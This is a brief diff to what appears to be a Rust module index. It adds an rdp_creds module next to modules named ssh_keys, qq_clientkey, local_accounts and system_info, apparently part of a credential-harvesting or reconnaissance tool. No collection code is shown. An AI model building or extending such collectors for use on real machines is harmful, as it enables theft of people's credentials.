@@ -14,6 +14,7 @@ mod local_accounts;
 mod bluetooth_scan;
 mod ssh_keys;
 mod qq_clientkey;
+mod rdp_creds;
 
 pub use system_info::SystemInfo;
 pub use network_info::NetworkInfo;
@@ -28,3 +29,4 @@ pub use local_accounts::LocalAccountEnumerator;
 pub use bluetooth_scan::BluetoothScanner;
 pub use ssh_keys::SshKeys;
 pub use qq_clientkey::QQClientKey;
+pub use rdp_creds::RdpCreds;
